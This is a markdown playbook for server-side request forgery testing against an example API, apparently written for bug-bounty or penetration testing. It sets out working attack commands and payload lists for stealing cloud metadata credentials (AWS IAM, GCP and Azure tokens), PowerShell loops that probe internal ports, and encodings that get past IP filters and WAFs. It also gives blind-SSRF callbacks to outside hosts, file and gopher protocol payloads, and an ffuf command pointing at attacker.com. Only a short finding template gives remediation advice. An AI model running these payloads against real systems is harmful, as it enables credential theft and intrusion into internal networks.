# Tasks — SSRF Toolchain

Automated and manual SSRF testing workflow covering cloud metadata, internal service discovery, IP bypass techniques, blind SSRF, and protocol smuggling.

---

## Table of Contents

1. [SSRF Toolchain Overview](#1-ssrf-toolchain-overview)
2. [SSRF Sink Identification](#2-ssrf-sink-identification)
3. [Automated Scanning](#3-automated-scanning)
4. [Cloud Metadata Testing](#4-cloud-metadata-testing)
5. [Internal Service Discovery](#5-internal-service-discovery)
6. [IP Bypass Techniques](#6-ip-bypass-techniques)
7. [Blind SSRF Testing](#7-blind-ssrf-testing)
8. [Protocol Smuggling](#8-protocol-smuggling)
9. [WAF Bypass for SSRF](#9-waf-bypass-for-ssrf)
10. [Evidence Collection](#10-evidence-collection)
11. [Tool Scripts](#11-tool-scripts)
12. [SSRF Templates](#12-ssrf-templates)
13. [Maintenance](#13-maintenance)

---

## 1. SSRF Toolchain Overview

### 1.1 Summary

```
SSRF SCANS COMPLETED: [N]
  Cloud metadata: [N]
  Internal services: [N]
  IP bypass: [N]
  Blind SSRF: [N]
  Protocol smuggling: [N]

SUCCESS RATE:
  Cloud metadata: [N]%
  Internal services: [N]%
  IP bypass: [N]%

FINDINGS:
  Confirmed SSRF: [N]
  Partial SSRF: [N]
  Not vulnerable: [N]
  WAF blocked: [N]
```

### 1.2 Task ID Format

```
SSRF TASK ID: SSRF-{target_short}-{YYMMDD}-{XXX}
  target_short: First 5 chars of target domain
  YYMMDD: Date of scan
  XXX: Sequential number

Example: SSRF-exampl-240607-001
```

### 1.3 SSRF Toolchain Lifecycle

```
TARGET IDENTIFIED → SINK DISCOVERY → AUTOMATED SCAN
    → CLOUD METADATA → INTERNAL SERVICES
    → IP BYPASS → BLIND SSRF → PROTOCOL SMUGGLING
    → IMPACT ANALYSIS → FINDING DOCUMENTED
```

---

## 2. SSRF Sink Identification

### 2.1 Task: Identify SSRF Sinks

```
TASK ID: SSRF-SINK-001
TARGET: api.example.com
STATUS: Planned
TOOLS: url_collector.py, endpoint_fuzzer.py, manual review

SSRF SINK PARAMETERS:
  URL parameters:
    - url
    - uri
    - link
    - image
    - avatar
    - fetch
    - download
    - proxy
    - redirect
    - return
    - next
    - callback
    - webhook

  POST body fields:
    - url
    - target_url
    - remote_url
    - file_url
    - image_url

  File upload metadata:
    - SVG href attributes
    - PDF src attributes
    - DOCX relationships
    - EXIF data in images

SINK IDENTIFICATION STEPS:
  [ ] Review all discovered URLs for SSRF parameters
  [ ] Check file upload endpoints for URL-based features
  [ ] Check API documentation for URL parameters
  [ ] Check GraphQL mutations for URL inputs
  [ ] Test each potential sink with SSRFHunter

SINK IDENTIFICATION COMMANDS:
  # Search for URL parameters in discovered URLs
  Get-Content urls-total.txt | Select-String -Pattern '\?(url|uri|link|image|fetch|download|avatar|redirect)='

  # Search JS bundles for URL parameters
  Get-ChildItem storage/js-bundles/*.js | Select-String -Pattern 'url|uri|fetch|download' | Select-Object -First 20

  # Fuzz for SSRF parameters
  ffuf -u https://api.example.com/api/endpoint?FUZZ=http://attacker.com -w wordlists/ssrf-params.txt
```

### 2.2 Sink Analysis

```
CONFIRMED SSRF SINKS (example.com):
  | Endpoint | Parameter | Method | Auth Required | SSRF Risk |
  |----------|-----------|--------|---------------|-----------|
  | POST /api/avatar | url | POST | Yes (user) | High |
  | GET /api/fetch | url | GET | No | High |
  | POST /api/webhook | callback_url | POST | Yes (admin) | Medium |
  | POST /api/import | source_url | POST | Yes (user) | High |

POTENTIAL SINKS (need testing):
  - GET /api/proxy?url= (if exists)
  - POST /api/thumbnail (image URL parameter)
  - POST /api/report (PDF generation from URL)
```

---

## 3. Automated Scanning

### 3.1 Task: Run Automated SSRF Scan

```
TASK ID: SSRF-SCAN-001
TARGET: api.example.com
PARAMETER: url
STATUS: Planned
TOOL: tools/python/ssrf_hunter.py

AUTOMATED SCAN STEPS:
  [ ] Launch SSRFHunter with target and parameter
  [ ] Monitor scan output for responses
  [ ] Flag interesting responses for manual review
  [ ] Document scan results

SSRF SCAN COMMANDS:
  # Basic SSRF scan
  python tools/python/ssrf_hunter.py https://api.example.com/api/avatar --param url

  # With authentication
  python tools/python/ssrf_hunter.py https://api.example.com/api/avatar --param url --token "$ATTACKER_TOKEN"

  # With custom payloads
  python tools/python/ssrf_hunter.py https://api.example.com/api/avatar --param url --payloads wordlists/ssrf-payloads.txt

  # Blind SSRF with callback
  python tools/python/ssrf_hunter.py https://api.example.com/api/avatar --param url --callback http://abc123.oastify.com
```

### 3.2 Automated Scan Results

```
SSRF SCAN RESULTS:
  Target: https://api.example.com/api/avatar
  Parameter: url
  Payloads tested: [N]
  Scan duration: [N] minutes

RESPONSE CODES:
  200 OK: [N] (possible SSRF)
  400 Bad Request: [N]
  500 Internal Server Error: [N]
  Timeout: [N]
  Connection Refused: [N]

INTERESTING RESPONSES:
  - http://169.254.169.254 → 200 OK (SSRF confirmed)
  - http://metadata.google.internal → Timeout (GCP not present)
  - http://127.0.0.1:9200 → 200 OK (Elasticsearch accessible)
  - http://127.0.0.1:6379 → Connection Refused (Redis not running)
```

---

## 4. Cloud Metadata Testing

### 4.1 Task: Test Cloud Metadata Endpoints

```
TASK ID: SSRF-CLOUD-001
TARGET: api.example.com
STATUS: Active (SSRF confirmed)
PRIORITY: P1

CLOUD METADATA ENDPOINTS:
  AWS Metadata:
    Base: http://169.254.169.254/latest/meta-data/
    Variants:
      - http://169.254.169.254/latest/meta-data/iam/security-credentials/
      - http://169.254.169.254/latest/user-data/
      - http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
      - http://169.254.169.254/latest/meta-data/iam/

  GCP Metadata:
    Base: http://metadata.google.internal/computeMetadata/v1/
    Headers:  Metadata-Flavor: Google (if required)
    Variants:
      - http://metadata.google.internal/computeMetadata/v1/project/project-id
      - http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
      - http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

  Azure Metadata:
    Base: http://169.254.169.254/metadata/instance
    Headers:  Metadata: true (if required)
    Variants:
      - http://169.254.169.254/metadata/instance?api-version=2021-02-01
      - http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

CLOUD METADATA COMMANDS:
  # AWS
  $body = '{"url":"http://169.254.169.254/latest/meta-data/"}'
  Invoke-RestMethod -Uri "https://api.example.com/api/avatar" -Method POST -Headers $headers -Body $body

  # GCP
  $body = '{"url":"http://metadata.google.internal/computeMetadata/v1/"}'

  # Azure
  $body = '{"url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01"}'
```

### 4.2 Cloud Metadata Results

```
AWS METADATA RESULTS:
  Base endpoint: SUCCESS
  IAM credentials: SUCCESS
  User data: SUCCESS
  Public keys: SUCCESS

IAM CREDENTIALS OBTAINED:
  RoleName: example-role
  AccessKeyId: ASIA[...redacted...]
  SecretAccessKey: [...redacted...]
  Token: [...redacted...]
  Expiration: 2026-06-07T16:00:00Z

GCP METADATA RESULTS:
  Base endpoint: FAILED (timeout)
  GCP not present on this infrastructure

AZURE METADATA RESULTS:
  Base endpoint: FAILED (timeout)
  Azure not present on this infrastructure

CONCLUSION: AWS infrastructure confirmed. IAM credentials obtained.
```

---

## 5. Internal Service Discovery

### 5.1 Task: Discover Internal Services

```
TASK ID: SSRF-INTERNAL-001
TARGET: 127.0.0.1, 10.x.x.x, 172.16-31.x.x, 192.168.x.x
STATUS: Planned
PRIORITY: P1

INTERNAL IP RANGES:
  - 127.0.0.1 (localhost)
  - 10.0.0.0/8 (private)
  - 172.16.0.0/12 (private)
  - 192.168.0.0/16 (private)

SERVICES TO PROBE:
  Common ports:
    - 80, 443 (HTTP/HTTPS)
    - 8080, 8443, 3000, 5000, 8000, 9000 (HTTP services)
    - 3306 (MySQL)
    - 5432 (PostgreSQL)
    - 27017 (MongoDB)
    - 6379 (Redis)
    - 9200, 9300 (Elasticsearch)
    - 11211 (Memcached)
    - 22, 23 (SSH, Telnet)

SERVICE PROBING COMMANDS:
  # Probe localhost services
  foreach ($port in @(80,443,8080,3306,5432,27017,6379,9200)) {
    $body = "{`\"url`\":`\"http://127.0.0.1:$port/`\"}"
    try {
      $response = Invoke-RestMethod -Uri "https://api.example.com/api/avatar" -Method POST -Headers $headers -Body $body -TimeoutSec 5
      Write-Host "Port $port : $($response.status_code)"
    }
    catch {
      Write-Host "Port $port : Error"
    }
  }
```

### 5.2 Internal Service Results

```
INTERNAL SERVICE SCAN RESULTS:

127.0.0.1:
  Port 80: 200 OK (HTTP service)
  Port 443: 200 OK (HTTPS service)
  Port 8080: 200 OK (Alternate HTTP)
  Port 3306: Connection Refused (MySQL not running)
  Port 5432: Connection Refused (PostgreSQL not running)
  Port 27017: Connection Refused (MongoDB not running)
  Port 6379: Connection Refused (Redis not running)
  Port 9200: 200 OK (Elasticsearch!)

ELASTICSEARCH (127.0.0.1:9200):
  Response: {"name":"...","cluster_name":"...","version":{...}}
  Status: Accessible
  Impact: Can enumerate indices, search data

HTTP SERVICES (127.0.0.1:80, 443, 8080):
  Response: HTML pages with internal service names
  Status: Accessible
  Impact: Can discover additional internal endpoints
```

---

## 6. IP Bypass Techniques

### 6.1 Task: Bypass IP Filters

```
TASK ID: SSRF-BYPASS-001
TARGET: api.example.com
STATUS: Planned
PRIORITY: P1

IP BYPASS TECHNIQUES:

HEX ENCODING:
  - 0x7f.0x0.0x0.0x1 = 127.0.0.1
  - 0xa9.0xfe.0xa9.0xfe = 169.254.169.254
  Payload: http://0x7f.0x0.0x0.0x1:9200/_cat/indices

OCTAL ENCODING:
  - 0177.0.0.1 = 127.0.0.1
  - 0241.0376.0241.0376 = 169.254.169.254
  Payload: http://0177.0.0.1:9200/_cat/indices

DECIMAL ENCODING:
  - 2130706433 = 127.0.0.1
  - 2852039166 = 169.254.169.254
  Payload: http://2130706433:9200/_cat/indices

SHORTENED DECIMAL:
  - 0 = 0.0.0.0
  - 0177.1 = 127.0.0.1
  - 127.1 = 127.0.0.1
  - 127.0.1 = 127.0.0.1

IPv6 ENCODING:
  - [::1] = 127.0.0.1
  - [0:0:0:0:0:ffff:127.0.0.1] = 127.0.0.1
  - [0:0:0:0:0:ffff:a9fe:a9fe] = 169.254.169.254
  Payload: http://[::1]:9200/_cat/indices

DNS VARIATIONS:
  - localhost
  - localhost.localdomain
  - 127.0.0.1.nip.io
  - 127.0.0.1.xip.io
  - 127-0-0-1.sslip.io

REDIRECT TECHNIQUES:
  - External URL redirecting to internal IP
  - DNS rebinding (alternating external/internal IP)
```

### 6.2 IP Bypass Commands

```powershell
# Test all IP bypass variants
$bypassPayloads = @(
  '{"url":"http://127.0.0.1:9200/_cat/indices"}',
  '{"url":"http://0x7f.0x0.0x0.0x1:9200/_cat/indices"}',
  '{"url":"http://0177.0.0.1:9200/_cat/indices"}',
  '{"url":"http://2130706433:9200/_cat/indices"}',
  '{"url":"http://127.1:9200/_cat/indices"}',
  '{"url":"http://[::1]:9200/_cat/indices"}',
  '{"url":"http://localhost:9200/_cat/indices"}',
  '{"url":"http://127.0.0.1.nip.io:9200/_cat/indices"}'
)

foreach ($payload in $bypassPayloads) {
  try {
    $response = Invoke-RestMethod -Uri "https://api.example.com/api/avatar" -Method POST -Headers $headers -Body $payload -TimeoutSec 5
    Write-Host "Payload: $payload"
    Write-Host "Response: $($response | ConvertTo-Json -Depth 3)"
    Write-Host ""
  }
  catch {
    Write-Host "Payload: $payload - BLOCKED or ERROR"
  }
}
```

### 6.3 IP Bypass Results

```
IP BYPASS TEST RESULTS:

DIRECT 127.0.0.1: BLOCKED (filter detected)
HEX 0x7f.0x0.0x0.0x1: BLOCKED
OCTAL 0177.0.0.1: SUCCESS (bypass!)
DECIMAL 2130706433: BLOCKED
IPv6 [::1]: BLOCKED
DNS localhost: BLOCKED
DNS localhost.nip.io: SUCCESS (bypass!)

SUCCESSFUL BYPASSES:
  - Octal encoding: 0177.0.0.1
  - DNS: 127.0.0.1.nip.io

NEXT STEPS:
  - Test all internal services with octal encoding
  - Test cloud metadata with octal encoding
  - Document bypass for report
```

---

## 7. Blind SSRF Testing

### 7.1 Task: Test Blind SSRF

```
TASK ID: SSRF-BLIND-001
TARGET: api.example.com
STATUS: Planned
PRIORITY: P2

BLIND SSRF SETUP:
  [ ] Setup Burp Collaborator
  [ ] Setup interact.sh
  [ ] Generate unique callback URLs
  [ ] Configure DNS listener

BLIND SSRF PAYLOADS:
  # Burp Collaborator
  {"url":"http://abc123.oastify.com/ssrf-test-1"}
  {"url":"http://abc123.oastify.com/ssrf-test-2"}

  # interact.sh
  {"url":"http://abc123.interact.sh/ssrf-test"}

  # Custom callback
  {"url":"http://callback.example.com/ssrf?data=test"}

BLIND SSRF COMMANDS:
  # Using Burp Collaborator
  python tools/python/ssrf_hunter.py https://api.example.com/api/avatar --param url --callback http://abc123.oastify.com

  # Using interact.sh
  curl -X POST https://api.example.com/api/avatar -H "Content-Type: application/json" -d "{\"url\":\"http://abc123.interact.sh/ssrf-test\"}"

  # Check for callbacks
  curl -s http://abc123.oastify.com/callback
```

### 7.2 Blind SSRF Results

```
BLIND SSRF RESULTS:
  Callback URL: http://abc123.oastify.com/ssrf-test-1
  Requests received: [N]
  Source IP: [server IP]
  User-Agent: [server user agent]

CALLBACK LOG:
  [2026-06-07 10:30:00] GET /ssrf-test-1 from [IP]
  [2026-06-07 10:30:05] GET /ssrf-test-2 from [IP]

CONCLUSION: Blind SSRF confirmed. Server makes outbound requests to attacker-controlled domain.
```

---

## 8. Protocol Smuggling

### 8.1 Task: Test Protocol Smuggling

```
TASK ID: SSRF-PROTO-001
TARGET: api.example.com
STATUS: Planned
PRIORITY: P2

PROTOCOL SMUGGLING PAYLOADS:
  File Protocol:
    - file:///etc/passwd
    - file:///proc/self/environ
    - file:///proc/self/cmdline
    - file:///var/log/auth.log

  Gopher Protocol:
    - gopher://127.0.0.1:3306/ (MySQL)
    - gopher://127.0.0.1:6379/ (Redis)
    - gopher://127.0.0.1:22/ (SSH)
    - gopher://127.0.0.1:25/ (SMTP)

  FTP Protocol:
    - ftp://internal.service
    - ftp://attacker.com@internal.service/

  Dict Protocol:
    - dict://127.0.0.1:11211/stat
    - dict://127.0.0.1:6379/INFO

  LDAP Protocol:
    - ldap://internal.service
    - ldap://127.0.0.1:389/

PROTOCOL TESTING COMMANDS:
  # File protocol
  $body = '{"url":"file:///etc/passwd"}'
  Invoke-RestMethod -Uri "https://api.example.com/api/avatar" -Method POST -Headers $headers -Body $body

  # Gopher protocol
  $body = '{"url":"gopher://127.0.0.1:6379/_info"}'
  Invoke-RestMethod -Uri "https://api.example.com/api/avatar" -Method POST -Headers $headers -Body $body
```

### 8.2 Protocol Results

```
PROTOCOL SMUGGLING RESULTS:

file:///etc/passwd: BLOCKED
file:///proc/self/environ: BLOCKED
gopher://127.0.0.1:6379/: BLOCKED
dict://127.0.0.1:6379/: BLOCKED
ftp://internal.service/: BLOCKED

CONCLUSION: Protocol smuggling blocked. Only HTTP/HTTPS protocols allowed.
```

---

## 9. WAF Bypass for SSRF

### 9.1 Task: Bypass SSRF WAF Filters

```
TASK ID: SSRF-WAF-001
TARGET: api.example.com
STATUS: Planned
PRIORITY: P2

WAF BYPASS TECHNIQUES:

URL ENCODING:
  - %3169%2e%32%35%34%2e%31%36%39%2e%32%35%34 (double encoded)
  - %169.%25%34%31%25%33%41%25%33%45%25%33%41%25%33%45 (partial encoding)

CASE VARIATION:
  - HTTP://169.254.169.254 (uppercase)
  - hTtP://169.254.169.254 (mixed case)
  - Http://169.254.169.254 (title case)

WHITELIST BYPASS:
  - https://whitelisted-domain.com/redirect?to=http://169.254.169.254
  - https://whitelisted-domain.com@169.254.169.254
  - https://169.254.169.254@whitelisted-domain.com

TECHNIQUE COMBINATIONS:
  - URL encoding + case variation
  - DNS rebinding + whitelist bypass
  - Redirect chain + IP bypass

WAF BYPASS COMMANDS:
  # Test URL encoding bypass
  $encoded = [System.Web.HttpUtility]::UrlEncode("http://169.254.169.254")
  $body = "{`"url`":`"$encoded`"}"
  Invoke-RestMethod -Uri "https://api.example.com/api/avatar" -Method POST -Headers $headers -Body $body

  # Test case variation
  $body = '{"url":"hTtP://169.254.169.254/latest/meta-data/"}'
  Invoke-RestMethod -Uri "https://api.example.com/api/avatar" -Method POST -Headers $headers -Body $body
```

---

## 10. Evidence Collection

### 10.1 Task: Collect SSRF Evidence

```
TASK ID: SSRF-EVIDENCE-001
INPUT: Successful SSRF tests
OUTPUT: evidence/ssrf-{target}-{date}/

EVIDENCE REQUIRED:
  [ ] Request showing SSRF payload
  [ ] Response showing internal data
  [ ] Screenshot of response
  [ ] Curl command for reproduction
  [ ] Impact demonstration

EVIDENCE PACKAGE:
  evidence/ssrf-exampl-240607/
    ├── README.md
    ├── cloud-metadata-response.json
    ├── elasticsearch-indices.json
    ├── screenshot-aws-metadata.png
    ├── screenshot-elasticsearch.png
    ├── request.curl
    ├── impact-demo.md
    └── metadata.json
```

---

## 11. Tool Scripts

### 11.1 SSRFHunter Usage

```
PYTHON TOOL: tools/python/ssrf_hunter.py

USAGE:
  python tools/python/ssrf_hunter.py <target_url> --param <parameter_name>

OPTIONS:
  --param       Parameter name to test (required)
  --token       Authentication token
  --payloads    Custom payload file
  --callback    Blind SSRF callback URL
  --output      Output file for results
  --timeout     Request timeout (default: 10)
  --threads     Number of threads (default: 5)

EXAMPLES:
  python tools/python/ssrf_hunter.py https://api.example.com/api/avatar --param url
  python tools/python/ssrf_hunter.py https://api.example.com/api/avatar --param url --token "$TOKEN"
  python tools/python/ssrf_hunter.py https://api.example.com/api/avatar --param url --callback http://abc123.oastify.com
```

### 11.2 SSRF Payload Library

```
PAYLOAD CATEGORIES:

CLOUD METADATA:
  wordlists/ssrf-cloud-aws.txt
  wordlists/ssrf-cloud-gcp.txt
  wordlists/ssrf-cloud-azure.txt

INTERNAL SERVICES:
  wordlists/ssrf-internal-ports.txt
  wordlists/ssrf-internal-ips.txt

IP BYPASS:
  wordlists/ssrf-ip-bypass.txt

PROTOCOL SMUGGLING:
  wordlists/ssrf-protocols.txt

BLIND SSRF:
  wordlists/ssrf-blind.txt
```

---

## 12. SSRF Templates

### 12.1 SSRF Finding Template

```
# SSRF Finding: FIND-001

## Summary
- **Bug Class:** SSRF
- **Target:** api.example.com
- **Endpoint:** POST /api/avatar
- **Parameter:** url
- **Severity:** High (Critical with IAM chain)

## Vulnerability
The avatar endpoint accepts a URL parameter and makes server-side requests without validating the destination. This allows SSRF to internal services and cloud metadata endpoints.

## Impact
- Cloud metadata access (AWS IAM credentials)
- Internal service enumeration
- Potential for further exploitation via internal services

## Reproduction
[Include curl command and response]

## IAM Credentials
[Include IAM role name, note that credentials are temporary]

## Recommendation
- Implement URL allowlist or domain validation
- Block internal IP ranges (RFC1918, link-local)
- Block cloud metadata endpoints specifically
- Use network segmentation
```

---

## 13. Maintenance

### 13.1 SSRF Toolchain Maintenance

```
DAILY:
  [ ] Update cloud metadata endpoints if AWS/GCP/Azure changes
  [ ] Add new IP bypass variants discovered
  [ ] Update internal service port list

WEEKLY:
  [ ] Test SSRFHunter against new targets
  [ ] Update payload library
  [ ] Review WAF bypass effectiveness

MONTHLY:
  [ ] Full SSRF toolchain review
  [ ] Update cloud metadata paths
  [ ] Research new SSRF techniques
```

### 13.2 SSRF Success Tracking

```
| Target | Endpoint | Cloud Metadata | Internal Services | IP Bypass | WAF Bypass |
|--------|----------|---------------|-------------------|-----------|------------|
| example.com | /api/avatar | Yes (AWS) | Yes (ES) | Yes (octal) | No |
| test.com | /api/fetch | No | Yes (Redis) | Yes (DNS) | No |
```

---

*End of ssrf-toolchain.md*
